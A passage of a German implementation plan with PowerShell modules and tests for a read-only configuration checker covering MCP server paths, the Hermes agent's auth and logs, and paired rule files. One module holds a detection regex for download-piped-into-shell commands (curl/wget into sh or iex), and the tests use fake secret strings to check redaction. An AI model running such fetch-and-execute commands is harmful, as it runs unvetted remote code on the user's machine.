function Test-PfadAufgeloest([string]$Pfad, [string]$Cwd) {
    if ([System.IO.Path]::IsPathRooted($Pfad)) {
        if (Test-Path -LiteralPath $Pfad) { return $Pfad } else { return $null }
    }
    foreach ($basis in @($Cwd, $Wurzel)) {
        $k = Join-Path $basis $Pfad
        if (Test-Path -LiteralPath $k) { return $k }
    }
    return $null
}

function Ist-PfadArg([string]$a) {
    if (-not $a) { return $false }
    if ($a -match '^[-@]' -or $a -match '://') { return $false }
    return ($a -match '[\\/]' -or $a -match '\.(js|mjs|cjs|py|ps1|cmd|bat|exe|json)$')
}

function Get-Eig($Objekt, [string]$Name) {
    $p = $Objekt.PSObject.Properties[$Name]
    if ($p) { return $p.Value }
    return $null
}

function Pruefe-McpPfade {
    $mf = Join-Path $Wurzel 'Agenten/MCP-Manifest.json'
    if (-not (Test-Path -LiteralPath $mf)) {
        Add-Befund -Id 'MCP-MANIFEST-FEHLT' -Modul 'mcp-pfade' -Schwere 'KRITISCH' -Titel 'MCP-Manifest fehlt' `
            -Beleg "Test-Path negativ: $mf" -Status 'gesichert' -Vorschlag 'Manifest aus git wiederherstellen; ohne Manifest sind die Server nicht pruefbar'
        return
    }
    $man = $null
    try { $man = Get-Content -LiteralPath $mf -Raw -Encoding UTF8 | ConvertFrom-Json -ErrorAction Stop }
    catch {
        Add-Befund -Id 'MCP-MANIFEST-DEFEKT' -Modul 'mcp-pfade' -Schwere 'KRITISCH' -Titel 'MCP-Manifest ist kein gueltiges JSON' `
            -Beleg "ConvertFrom-Json scheitert fuer $mf" -Status 'gesichert' -Vorschlag 'Manifest mit git diff gegen den letzten guten Stand vergleichen'
        return
    }
    $ausserhalb = New-Object System.Collections.ArrayList
    $wl = $Wurzel.ToLowerInvariant()
    foreach ($s in @($man.servers)) {
        if ($null -eq $s) { continue }
        $name = [string](Get-Eig $s 'name')
        if ((Get-Eig $s 'enabled') -eq $false) { continue }
        $cwd = $Wurzel
        $cwdRoh = [string](Get-Eig $s 'cwd')
        if ($cwdRoh) {
            if ([System.IO.Path]::IsPathRooted($cwdRoh)) { $cwd = $cwdRoh } else { $cwd = Join-Path $Wurzel $cwdRoh }
            if (-not (Test-Path -LiteralPath $cwd)) {
                Add-Befund -Id "MCP-CWD-FEHLT-$name" -Modul 'mcp-pfade' -Schwere 'KRITISCH' -Titel "Arbeitsverzeichnis von '$name' fehlt" `
                    -Beleg "cwd '$cwdRoh' aufgeloest zu $cwd, Test-Path negativ" -Status 'gesichert' -Vorschlag 'cwd im Manifest korrigieren oder Ordner wiederherstellen'
                continue
            }
        }
        $cmd = [string](Get-Eig $s 'command')
        $fehlend = New-Object System.Collections.ArrayList
        $aufgeloest = New-Object System.Collections.ArrayList
        if ($cmd) {
            if ($cmd -match '[\\/]') {
                $r = Test-PfadAufgeloest $cmd $cwd
                if ($r) { [void]$aufgeloest.Add($r) } else { [void]$fehlend.Add("command: $cmd") }
            }
            elseif (-not (Get-Command $cmd -ErrorAction SilentlyContinue)) {
                Add-Befund -Id "MCP-COMMAND-NICHT-IM-PFAD-$name" -Modul 'mcp-pfade' -Schwere 'WARNUNG' -Titel "Command '$cmd' von '$name' nicht im PATH" `
                    -Beleg "Get-Command $cmd liefert nichts (in dieser Shell; Server-Start kann anderen PATH haben)" -Status 'Vermutung' `
                    -Vorschlag 'Programm installieren oder vollen Pfad ins Manifest schreiben'
            }
        }
        foreach ($a in @(Get-Eig $s 'args')) {
            $as = [string]$a
            if (-not (Ist-PfadArg $as)) { continue }
            $r = Test-PfadAufgeloest $as $cwd
            if ($r) { [void]$aufgeloest.Add($r) } else { [void]$fehlend.Add("args: $as") }
        }
        if ($fehlend.Count -gt 0) {
            Add-Befund -Id "MCP-PFAD-FEHLT-$name" -Modul 'mcp-pfade' -Schwere 'KRITISCH' -Titel "Server '$name': Pfad fehlt" `
                -Beleg ("Fehlend: " + ($fehlend -join '; ') + ". Geprueft gegen cwd $cwd und Wurzel $Wurzel; Test-Path negativ") -Status 'gesichert' `
                -Vorschlag 'Datei bauen/wiederherstellen oder Manifest-Eintrag korrigieren (Reparatur nur nach Freigabe)'
        }
        $voll = (@($cmd) + @(@(Get-Eig $s 'args') | ForEach-Object { [string]$_ })) -join ' '
        if ($voll -match '(?i)(curl|wget|iwr|invoke-webrequest)[^|]*\|\s*(sh|bash|zsh|iex|invoke-expression)\b') {
            Add-Befund -Id "MCP-STARTER-AUFFAELLIG-$name" -Modul 'mcp-pfade' -Schwere 'WARNUNG' -Titel "Starter von '$name' holt Code aus dem Netz und fuehrt ihn aus" `
                -Beleg 'command/args enthalten Download-Pipe in eine Shell oder iex' -Status 'gesichert' -Vorschlag 'Skript lokal ablegen und pruefen; Entscheidung liegt bei Max'
        }
        foreach ($p in $aufgeloest) {
            $voll2 = [System.IO.Path]::GetFullPath($p).ToLowerInvariant()
            if (-not $voll2.StartsWith($wl)) { [void]$ausserhalb.Add("$name -> $p"); break }
        }
    }
    if ($ausserhalb.Count -gt 0) {
        Add-Befund -Id 'MCP-AUSSERHALB-WURZEL' -Modul 'mcp-pfade' -Schwere 'HINWEIS' -Titel "$($ausserhalb.Count) Server starten Programme ausserhalb der Wurzel" `
            -Beleg (($ausserhalb | Select-Object -First 8) -join '; ') -Status 'gesichert' -Vorschlag 'Nur zur Kenntnis: Pfade ausserhalb der Wurzel ueberleben einen Umzug auf die SSD nicht'
    }
    $sc = Join-Path $Wurzel 'Agenten/mcp-sync-check.ps1'
    if ((Test-Path -LiteralPath $sc) -and -not $OhneExtern) {
        $ps = (Get-Process -Id $PID).Path
        $r = Invoke-Extern -Datei $ps -Argumente @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $sc) -TimeoutSek $ModulLimitSek
        if ($r.TimedOut) {
            Add-Befund -Id 'MCP-SYNC-ZEITLIMIT' -Modul 'mcp-pfade' -Schwere 'UNKLAR' -Titel 'mcp-sync-check.ps1 antwortet nicht im Zeitlimit' `
                -Beleg "Abbruch nach $ModulLimitSek s" -Status 'gesichert' -Vorschlag 'Skript einzeln ausfuehren'
        }
        elseif ($r.ExitCode -ne 0) {
            $zl = @(($r.Out + "`n" + $r.Err) -split "`r?`n" | Where-Object { $_.Trim() } | Select-Object -First 3) -join ' / '
            Add-Befund -Id 'MCP-SYNC-ABWEICHUNG' -Modul 'mcp-pfade' -Schwere 'HINWEIS' -Titel 'mcp-sync-check.ps1 meldet Abweichung' `
                -Beleg "Exit $($r.ExitCode): $zl" -Status 'gesichert' -Vorschlag 'Ausgabe des Skripts lesen; Abgleich Manifest und Client-Configs'
        }
    }
}

```

(Falls Step 1 ergab, dass `mcp-sync-check.ps1` schreibt: den Block `$sc = ...` ersetzen durch einen UNKLAR-Befund `MCP-SYNC-NICHT-GEPRUEFT`.)

- [ ] **Step 5: Test laufen lassen, Erfolg bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alle `ok`, `konfig-doktor bestanden`.

- [ ] **Step 6: Commit**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1; git commit -m "konfig-doktor: Modul mcp-pfade (Pfade gegen cwd des Eintrags)" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`

---

### Task 3: Modul `hermes`

**Files:**
- Modify: `Agenten/Routinen/konfig-doktor.ps1`
- Modify: `Agenten/Routinen/tests/konfig-doktor.test.ps1`

**Interfaces:**
- Consumes: `Add-Befund`, `Invoke-Extern`, `$Wurzel`, `$WurzelExplizit`, `$OhneExtern`, `$Kurz`, `$ModulLimitSek`
- Produces: `Pruefe-Hermes`; IDs `HERMES-NICHT-WINDOWS`, `HERMES-ORDNER-FEHLT`, `HERMES-HOME-ABWEICHEND`, `HERMES-CONFIG-FEHLT`, `HERMES-CONFIG-GESCHRUMPFT`, `HERMES-AUTH-DEFEKT`, `HERMES-AUTH-FEHLT`, `HERMES-AUTH-ABGELAUFEN`, `HERMES-CORRUPT-RESTE`, `HERMES-PROFILE-OHNE-CONFIG`, `HERMES-LOGFEHLER`, `HERMES-DOCTOR-NICHT-AUFRUFBAR`, `HERMES-DOCTOR`; Hilfen `Get-AblaufListe`, `ConvertTo-Zeit`

- [ ] **Step 1: Selbstdiagnose als lesend belegen**

In einer Shell mit bereinigter Umgebung: `Remove-Item Env:PYTHONHOME, Env:PYTHONPATH -ErrorAction SilentlyContinue; hermes doctor --help`. Belegen, dass `doctor` ohne `--fix` o. ä. nichts schreibt. Ist das nicht belegbar: den `hermes doctor`-Block in Step 4 streichen, stattdessen UNKLAR `HERMES-DOCTOR-NICHT-AUFRUFBAR`, im Ledger vermerken.

- [ ] **Step 2: Failing Tests schreiben**

Oberhalb von `# === ENDE` einfügen:

```powershell
Write-Host '--- Modul hermes ---'
$fx = Neue-Wurzel
$h = Join-Path $fx 'Agenten/Hermes'
Schreibe (Join-Path $h 'config.yaml') ('x' * 100)
Schreibe (Join-Path $h 'config.yaml.bak-20260101') ('x' * 1000)
Schreibe (Join-Path $h 'auth.json') '{"providers":{"demo":{"access_token":"FAKE-SECRET-VALUE-ABC123XYZ","expires_at":"2020-01-01T00:00:00Z"}}}'
Schreibe (Join-Path $h 'auth.json.corrupt') 'zzz'
Schreibe (Join-Path $h 'profiles/mit/config.yaml') 'a: 1'
New-Item -ItemType Directory -Path (Join-Path $h 'profiles/ohne') -Force | Out-Null
Schreibe (Join-Path $h 'logs/errors.log') ("ok`nERROR erster`nERROR zweiter token sk-abcdefghijklmnopqrstuvwxyz123456`nINFO fertig`n")
$r = Lauf $fx @('hermes')
$alles = ($r | ConvertTo-Json -Depth 4)
Pruefe 'Config-Schrumpfung wird als UNKLAR gemeldet' ((Hat $r 'HERMES-CONFIG-GESCHRUMPFT') -and ((Schwere-Von $r 'HERMES-CONFIG-GESCHRUMPFT') -eq 'UNKLAR'))
Pruefe 'abgelaufene expires_at: WARNUNG' ((Hat $r 'HERMES-AUTH-ABGELAUFEN') -and ((Schwere-Von $r 'HERMES-AUTH-ABGELAUFEN') -eq 'WARNUNG'))
Pruefe 'kein Auth-Wert in irgendeinem Befund' ($alles -notmatch 'FAKE-SECRET-VALUE')
Pruefe 'kein Log-Schluessel in irgendeinem Befund' ($alles -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456')
Pruefe '.corrupt-Reste: HINWEIS' ((Hat $r 'HERMES-CORRUPT-RESTE') -and ((Schwere-Von $r 'HERMES-CORRUPT-RESTE') -eq 'HINWEIS'))
Pruefe 'Profil ohne Config: HINWEIS' (Hat $r 'HERMES-PROFILE-OHNE-CONFIG')
Pruefe 'Logfehler gezaehlt: HINWEIS' ((Hat $r 'HERMES-LOGFEHLER') -and ((Schwere-Von $r 'HERMES-LOGFEHLER') -eq 'HINWEIS'))
Pruefe 'gesunde Config + gueltige Auth: kein AUTH-DEFEKT' (-not (Hat $r 'HERMES-AUTH-DEFEKT'))
Schreibe (Join-Path $h 'auth.json') '{ kaputt FAKE-SECRET-VALUE-ABC123XYZ'
$r = Lauf $fx @('hermes')
$alles = ($r | ConvertTo-Json -Depth 4)
Pruefe 'kaputte auth.json: KRITISCH' ((Hat $r 'HERMES-AUTH-DEFEKT') -and ((Schwere-Von $r 'HERMES-AUTH-DEFEKT') -eq 'KRITISCH'))
Pruefe 'kaputte auth.json: Inhalt nicht ausgegeben' ($alles -notmatch 'FAKE-SECRET-VALUE')
Remove-Item -LiteralPath (Join-Path $h 'auth.json')
$r = Lauf $fx @('hermes')
Pruefe 'auth.json fehlt, .corrupt da: KRITISCH' ((Hat $r 'HERMES-AUTH-FEHLT') -and ((Schwere-Von $r 'HERMES-AUTH-FEHLT') -eq 'KRITISCH'))
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('hermes')
Pruefe 'kein Hermes-Ordner: UNKLAR statt Fehler' ((Hat $r 'HERMES-ORDNER-FEHLT') -and ((Schwere-Von $r 'HERMES-ORDNER-FEHLT') -eq 'UNKLAR'))

```

- [ ] **Step 3: Test laufen lassen, Fehlschlag bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: Abschnitt `hermes` zeigt `FEHLT`-Zeilen, Ende `FEHLGESCHLAGEN`.

- [ ] **Step 4: Modul implementieren**

Oberhalb von `# === MODULE` einfügen:

```powershell
# ---------- Modul 2: hermes ----------
function Get-AblaufListe($Obj, [string]$Pfad, [int]$Tiefe, $Liste) {
    if ($null -eq $Obj -or $Tiefe -gt 5) { return }
    if ($Obj -is [System.Management.Automation.PSCustomObject]) {
        foreach ($p in $Obj.PSObject.Properties) {
            if ($p.Name -eq 'expires_at') { [void]$Liste.Add([pscustomobject]@{ Pfad = "$Pfad/expires_at"; Wert = $p.Value }) }
            else { Get-AblaufListe $p.Value "$Pfad/$($p.Name)" ($Tiefe + 1) $Liste }
        }
    }
    elseif ($Obj -is [System.Collections.IEnumerable] -and $Obj -isnot [string]) {
        $i = 0
        foreach ($e in $Obj) { Get-AblaufListe $e "$Pfad[$i]" ($Tiefe + 1) $Liste; $i++ }
    }
}

function ConvertTo-Zeit($Wert) {
    if ($null -eq $Wert) { return $null }
    if ($Wert -is [datetime]) { return $Wert.ToUniversalTime() }
    if ($Wert -is [ValueType] -and $Wert -isnot [bool]) {
        $n = [double]$Wert
        if ($n -gt 100000000000) { $n = $n / 1000 }
        return (New-Object DateTime 1970, 1, 1, 0, 0, 0, ([DateTimeKind]::Utc)).AddSeconds($n)
    }
    $d = [datetime]::MinValue
    $stil = [System.Globalization.DateTimeStyles]::AdjustToUniversal -bor [System.Globalization.DateTimeStyles]::AssumeUniversal
    if ([datetime]::TryParse([string]$Wert, [System.Globalization.CultureInfo]::InvariantCulture, $stil, [ref]$d)) { return $d }
    return $null
}

function Pruefe-Hermes {
    if ($env:OS -ne 'Windows_NT') {
        Add-Befund -Id 'HERMES-NICHT-WINDOWS' -Modul 'hermes' -Schwere 'UNKLAR' -Titel 'Hermes-Pruefung uebersprungen (kein Windows)' `
            -Beleg 'Linux/Cloud-Checkout: Junctions und venvs fehlen' -Status 'gesichert' -Vorschlag 'Auf Max'' Rechner ausfuehren'
        return
    }
    $standard = Join-Path $Wurzel 'Agenten/Hermes'
    $heim = $standard
    $envHome = [string]$env:HERMES_HOME
    if (-not $WurzelExplizit -and $envHome) {
        $heim = $envHome
        $a = [System.IO.Path]::GetFullPath($envHome).TrimEnd('\', '/')
        $b = [System.IO.Path]::GetFullPath($standard).TrimEnd('\', '/')
        if ($a -ne $b) {
            Add-Befund -Id 'HERMES-HOME-ABWEICHEND' -Modul 'hermes' -Schwere 'HINWEIS' -Titel 'HERMES_HOME zeigt nicht auf Agenten/Hermes' `
                -Beleg "HERMES_HOME=$envHome, erwartet $standard" -Status 'gesichert' -Vorschlag 'Pruefen, ob das gewollt ist (zweite Instanz?)'
        }
    }
    if (-not (Test-Path -LiteralPath $heim)) {
        Add-Befund -Id 'HERMES-ORDNER-FEHLT' -Modul 'hermes' -Schwere 'UNKLAR' -Titel 'Hermes-Ordner nicht vorhanden' `
            -Beleg "Test-Path negativ: $heim" -Status 'gesichert' -Vorschlag 'Bei frischem Checkout erwartbar; sonst Pfad/HERMES_HOME klaeren'
        return
    }
    $cfg = Join-Path $heim 'config.yaml'
    if (-not (Test-Path -LiteralPath $cfg)) {
        Add-Befund -Id 'HERMES-CONFIG-FEHLT' -Modul 'hermes' -Schwere 'KRITISCH' -Titel 'Hermes config.yaml fehlt' `
            -Beleg "Test-Path negativ: $cfg" -Status 'gesichert' -Vorschlag 'Aus der juengsten Altkopie (config.yaml.bak-*) wiederherstellen - nach Freigabe'
    }
    else {
        $gr = (Get-Item -LiteralPath $cfg).Length
        $baks = @(Get-ChildItem -LiteralPath $heim -File -Filter 'config.yaml.bak*' -ErrorAction SilentlyContinue)
        if ($baks.Count -gt 0) {
            $max = ($baks | Measure-Object -Property Length -Maximum).Maximum
            if ($gr -lt (0.5 * $max)) {
                Add-Befund -Id 'HERMES-CONFIG-GESCHRUMPFT' -Modul 'hermes' -Schwere 'UNKLAR' -Titel 'Hermes config.yaml ist deutlich kleiner als die groesste Altkopie' `
                    -Beleg ("config.yaml {0} KB, groesste Altkopie {1} KB" -f [math]::Round($gr / 1KB, 1), [math]::Round($max / 1KB, 1)) -Status 'Vermutung' `
                    -Vorschlag 'Max: Ist das Schrumpfen gewollt (Bereinigung) oder gingen Abschnitte verloren? Diff gegen die Altkopie zeigt es'
            }
        }
    }
    $auth = Join-Path $heim 'auth.json'
    $corrupt = @(Get-ChildItem -LiteralPath $heim -File -Filter '*.corrupt' -ErrorAction SilentlyContinue)
    if (Test-Path -LiteralPath $auth) {
        $json = $null
        $lesbar = $true
        try { $json = Get-Content -LiteralPath $auth -Raw -Encoding UTF8 | ConvertFrom-Json -ErrorAction Stop } catch { $lesbar = $false }
        if (-not $lesbar -or $null -eq $json) {
            Add-Befund -Id 'HERMES-AUTH-DEFEKT' -Modul 'hermes' -Schwere 'KRITISCH' -Titel 'auth.json ist kein gueltiges JSON' `
                -Beleg 'ConvertFrom-Json scheitert (Inhalt bewusst nicht ausgegeben)' -Status 'gesichert' -Vorschlag 'Neu anmelden oder aus Sicherung holen - nach Freigabe'
        }
        else {
            $liste = New-Object System.Collections.ArrayList
            Get-AblaufListe $json '' 0 $liste
            $jetzt = (Get-Date).ToUniversalTime()
            $abgelaufen = @()
            foreach ($e in $liste) {
                $t = ConvertTo-Zeit $e.Wert
                if ($t -and $t -lt $jetzt) { $abgelaufen += ("{0} (seit {1})" -f $e.Pfad, $t.ToString('yyyy-MM-dd')) }
            }
            if ($abgelaufen.Count -gt 0) {
                Add-Befund -Id 'HERMES-AUTH-ABGELAUFEN' -Modul 'hermes' -Schwere 'WARNUNG' -Titel "$($abgelaufen.Count) Anmeldung(en) in auth.json abgelaufen" `
                    -Beleg ($abgelaufen -join '; ') -Status 'Vermutung' -Vorschlag 'Ein Refresh-Token kann den Ablauf ausgleichen; Login im Hermes-Client erneuern, falls Aufrufe scheitern'
            }
        }
    }
    elseif (@($corrupt | Where-Object { $_.Name -like 'auth.json*' }).Count -gt 0) {
        Add-Befund -Id 'HERMES-AUTH-FEHLT' -Modul 'hermes' -Schwere 'KRITISCH' -Titel 'auth.json fehlt, nur eine .corrupt-Kopie liegt vor' `
            -Beleg 'Test-Path auth.json negativ; auth.json.corrupt vorhanden' -Status 'gesichert' -Vorschlag 'Neu anmelden - nach Freigabe'
    }
    if ($corrupt.Count -gt 0) {
        $namen = @($corrupt | ForEach-Object { "{0} ({1})" -f $_.Name, $_.LastWriteTime.ToString('yyyy-MM-dd') })
        Add-Befund -Id 'HERMES-CORRUPT-RESTE' -Modul 'hermes' -Schwere 'HINWEIS' -Titel "$($corrupt.Count) .corrupt-Reste im Hermes-Ordner" `
            -Beleg ($namen -join '; ') -Status 'gesichert' -Vorschlag 'Ursache der Beschaedigung klaeren, danach aufraeumen (Teilprojekt B)'
    }
    $pro = Join-Path $heim 'profiles'
    if (Test-Path -LiteralPath $pro) {
        $ohne = @(Get-ChildItem -LiteralPath $pro -Directory -ErrorAction SilentlyContinue | Where-Object { -not (Test-Path -LiteralPath (Join-Path $_.FullName 'config.yaml')) })
        if ($ohne.Count -gt 0) {
            Add-Befund -Id 'HERMES-PROFILE-OHNE-CONFIG' -Modul 'hermes' -Schwere 'HINWEIS' -Titel "$($ohne.Count) Profil(e) ohne eigene config.yaml" `
                -Beleg (($ohne | Select-Object -First 10 | ForEach-Object { $_.Name }) -join ', ') -Status 'gesichert' `
                -Vorschlag 'Pruefen, ob das Profil die Hauptconfig erbt (empirisch, nicht annehmen)'
        }
    }
    $log = Join-Path $heim 'logs/errors.log'
    if (Test-Path -LiteralPath $log) {
        $zeilen = @(Get-Content -LiteralPath $log -Tail 200 -ErrorAction SilentlyContinue)
        $fz = @($zeilen | Where-Object { $_ -match '\bERROR\b|Traceback' })
        if ($fz.Count -gt 0) {
            $letzte = [string]$fz[-1]
            if ($letzte.Length -gt 160) { $letzte = $letzte.Substring(0, 160) }
            Add-Befund -Id 'HERMES-LOGFEHLER' -Modul 'hermes' -Schwere 'HINWEIS' -Titel "$($fz.Count) Fehlerzeilen in den letzten 200 Zeilen von errors.log" `
                -Beleg "Letzte: $letzte" -Status 'gesichert' -Vorschlag 'Log lesen, bevor spekuliert wird'
        }
    }
    if (-not $OhneExtern -and -not $Kurz) {
        $hc = Get-Command hermes -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $hc -or $hc.Source -notmatch '\.exe$') {
            Add-Befund -Id 'HERMES-DOCTOR-NICHT-AUFRUFBAR' -Modul 'hermes' -Schwere 'UNKLAR' -Titel 'hermes.exe nicht gefunden, Selbstdiagnose uebersprungen' `
                -Beleg 'Get-Command hermes liefert keine .exe' -Status 'gesichert' -Vorschlag 'hermes doctor von Hand mit bereinigter Umgebung (PYTHONHOME/PYTHONPATH entfernt) ausfuehren'
        }
        else {
            $r = Invoke-Extern -Datei $hc.Source -Argumente @('doctor') -TimeoutSek $ModulLimitSek -EntferneEnv @('PYTHONHOME', 'PYTHONPATH') -SetzeEnv @{ HERMES_HOME = $heim }
            if ($r.TimedOut) {
                Add-Befund -Id 'HERMES-DOCTOR-ZEITLIMIT' -Modul 'hermes' -Schwere 'UNKLAR' -Titel 'hermes doctor antwortet nicht im Zeitlimit' `
                    -Beleg "Abbruch nach $ModulLimitSek s" -Status 'gesichert' -Vorschlag 'hermes doctor von Hand ausfuehren'
            }
            else {
                $pz = @(($r.Out + "`n" + $r.Err) -split "`r?`n" | Where-Object { $_ -match '(?i)\[FAIL\]|error|fehler|failed' })
                if ($pz.Count -gt 0 -or $r.ExitCode -ne 0) {
                    $erste = @($pz | Select-Object -First 3 | ForEach-Object { if ($_.Length -gt 120) { $_.Substring(0, 120) } else { $_ } }) -join ' / '
                    Add-Befund -Id 'HERMES-DOCTOR' -Modul 'hermes' -Schwere 'HINWEIS' -Titel "hermes doctor: $($pz.Count) Problemzeile(n), Exit $($r.ExitCode)" `
                        -Beleg $erste -Status 'gesichert' -Vorschlag 'Ausgabe als Hypothese lesen, nicht als Befund (Meldungen koennen aus falschem Kontext stammen)'
                }
            }
        }
    }
}

```

(Falls Step 1 die Selbstdiagnose als nicht belegt lesend ergab: den ganzen Block `if (-not $OhneExtern -and -not $Kurz) { ... }` durch einen einzelnen UNKLAR-Befund `HERMES-DOCTOR-NICHT-AUFRUFBAR` ersetzen.)

- [ ] **Step 5: Test laufen lassen, Erfolg bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alle `ok`, `konfig-doktor bestanden`.

- [ ] **Step 6: Commit**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1; git commit -m "konfig-doktor: Modul hermes (Config, Auth ohne Werte, Profile, Logs)" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`

---

### Task 4: Modul `regelpaare`

**Files:**
- Modify: `Agenten/Routinen/konfig-doktor.ps1`
- Modify: `Agenten/Routinen/tests/konfig-doktor.test.ps1`

**Interfaces:**
- Consumes: `Add-Befund`, `$Wurzel`
- Produces: `Pruefe-Regelpaare`; IDs `REGELPAAR-ORDNER-FEHLT-<ort>`, `REGELPAAR-FEHLT-<ort>`, `REGELPAAR-INHALT-<ort>`, `REGELPAAR-ZEILENENDE-<ort>`; `<ort>` = `Wurzel`, `MaxHirn`, `Werkstatt`; Hilfe `Get-NormalText <byte[]>`

- [ ] **Step 1: Failing Tests schreiben**

Oberhalb von `# === ENDE` einfügen:

```powershell
Write-Host '--- Modul regelpaare ---'
$fx = Neue-Wurzel
$inh = "Zeile eins`nZeile zwei`nZeile drei`n"
Schreibe (Join-Path $fx 'CLAUDE.md') $inh
Schreibe (Join-Path $fx 'AGENTS.md') $inh
Schreibe (Join-Path $fx 'MaxHirn/CLAUDE.md') ([string][char]0xFEFF + ($inh -replace "`n", "`r`n"))
Schreibe (Join-Path $fx 'MaxHirn/AGENTS.md') $inh
Schreibe (Join-Path $fx 'Werkstatt/CLAUDE.md') $inh
Schreibe (Join-Path $fx 'Werkstatt/AGENTS.md') "Zeile eins`nZeile ZWEI`nZeile drei`n"
$r = Lauf $fx @('regelpaare')
Pruefe 'identische Bytes: kein Befund fuer Wurzel' (-not (Hat $r 'REGELPAAR-INHALT-Wurzel') -and -not (Hat $r 'REGELPAAR-ZEILENENDE-Wurzel'))
Pruefe 'BOM+CRLF bei gleichem Inhalt: HINWEIS, nicht WARNUNG' ((Schwere-Von $r 'REGELPAAR-ZEILENENDE-MaxHirn') -eq 'HINWEIS' -and -not (Hat $r 'REGELPAAR-INHALT-MaxHirn'))
Pruefe 'inhaltliche Abweichung: WARNUNG mit Zeilennummer' ((Schwere-Von $r 'REGELPAAR-INHALT-Werkstatt') -eq 'WARNUNG' -and (($r | Where-Object { $_.id -eq 'REGELPAAR-INHALT-Werkstatt' }).beleg -match 'Zeile 2'))
Remove-Item -LiteralPath (Join-Path $fx 'Werkstatt/AGENTS.md')
$r = Lauf $fx @('regelpaare')
Pruefe 'fehlende Partnerdatei: WARNUNG' ((Schwere-Von $r 'REGELPAAR-FEHLT-Werkstatt') -eq 'WARNUNG')
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('regelpaare')
Pruefe 'beide Dateien fehlen (frischer Checkout): UNKLAR' ((Schwere-Von $r 'REGELPAAR-ORDNER-FEHLT-Wurzel') -eq 'UNKLAR')

```

- [ ] **Step 2: Test laufen lassen, Fehlschlag bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: Abschnitt `regelpaare` zeigt `FEHLT`.

- [ ] **Step 3: Modul implementieren**

Oberhalb von `# === MODULE` einfügen:

```powershell
# ---------- Modul 3: regelpaare ----------
function Get-NormalText([byte[]]$Bytes) {
    $t = [System.Text.Encoding]::UTF8.GetString($Bytes)
    $t = $t.TrimStart([char]0xFEFF)
    return ($t -replace "`r`n", "`n")
}

function Pruefe-Regelpaare {
    foreach ($rel in @('', 'MaxHirn', 'Werkstatt')) {
        $dir = $Wurzel
        $ort = 'Wurzel'
        if ($rel) { $dir = Join-Path $Wurzel $rel; $ort = $rel }
        $c = Join-Path $dir 'CLAUDE.md'
        $a = Join-Path $dir 'AGENTS.md'
        $hc = Test-Path -LiteralPath $c
        $ha = Test-Path -LiteralPath $a
        if (-not $hc -and -not $ha) {
            Add-Befund -Id "REGELPAAR-ORDNER-FEHLT-$ort" -Modul 'regelpaare' -Schwere 'UNKLAR' -Titel "Regelpaar in '$ort' nicht vorhanden" `
                -Beleg "Weder CLAUDE.md noch AGENTS.md unter $dir" -Status 'gesichert' -Vorschlag 'Bei frischem Checkout oder toter Junction erwartbar; sonst klaeren'
            continue
        }
        if ($hc -ne $ha) {
            $fehlt = 'AGENTS.md'
            if (-not $hc) { $fehlt = 'CLAUDE.md' }
            Add-Befund -Id "REGELPAAR-FEHLT-$ort" -Modul 'regelpaare' -Schwere 'WARNUNG' -Titel "Regelpaar '$ort': $fehlt fehlt" `
                -Beleg "Test-Path negativ fuer $fehlt unter $dir" -Status 'gesichert' -Vorschlag 'Partnerdatei aus der vorhandenen herstellen (Paar muss identisch bleiben) - nach Freigabe'
            continue
        }
        $bc = [System.IO.File]::ReadAllBytes($c)
        $ba = [System.IO.File]::ReadAllBytes($a)
        $gleichBytes = ($bc.Length -eq $ba.Length) -and ([Convert]::ToBase64String($bc) -ceq [Convert]::ToBase64String($ba))
        if ($gleichBytes) { continue }
        $tc = Get-NormalText $bc
        $ta = Get-NormalText $ba
        if ($tc -ceq $ta) {
            $crC = [regex]::Matches([System.Text.Encoding]::UTF8.GetString($bc), "`r`n").Count
            $crA = [regex]::Matches([System.Text.Encoding]::UTF8.GetString($ba), "`r`n").Count
            Add-Befund -Id "REGELPAAR-ZEILENENDE-$ort" -Modul 'regelpaare' -Schwere 'HINWEIS' -Titel "Regelpaar '$ort': nur Zeilenenden/BOM verschieden" `
                -Beleg "CLAUDE.md $($bc.Length) Bytes (CRLF $crC), AGENTS.md $($ba.Length) Bytes (CRLF $crA); Text nach Normalisierung gleich" -Status 'gesichert' `
                -Vorschlag 'Inhaltlich in Ordnung; AGENTS.md soll LF sein - nicht per Rewrite aendern (Hausregel)'
        }
        else {
            $zc = $tc -split "`n"
            $za = $ta -split "`n"
            $n = [Math]::Min($zc.Count, $za.Count)
            $erste = 0
            for ($i = 0; $i -lt $n; $i++) { if ($zc[$i] -cne $za[$i]) { $erste = $i + 1; break } }
            if ($erste -eq 0) { $erste = $n + 1 }
            Add-Befund -Id "REGELPAAR-INHALT-$ort" -Modul 'regelpaare' -Schwere 'WARNUNG' -Titel "Regelpaar '$ort': Inhalt weicht ab" `
                -Beleg "Erste Abweichung in Zeile $erste; CLAUDE.md $($zc.Count) Zeilen, AGENTS.md $($za.Count) Zeilen" -Status 'gesichert' `
                -Vorschlag 'Diff beider Dateien ansehen; die gepflegte Fassung in beide uebernehmen (gezielter Ersatz) - nach Freigabe'
        }
    }
}

```

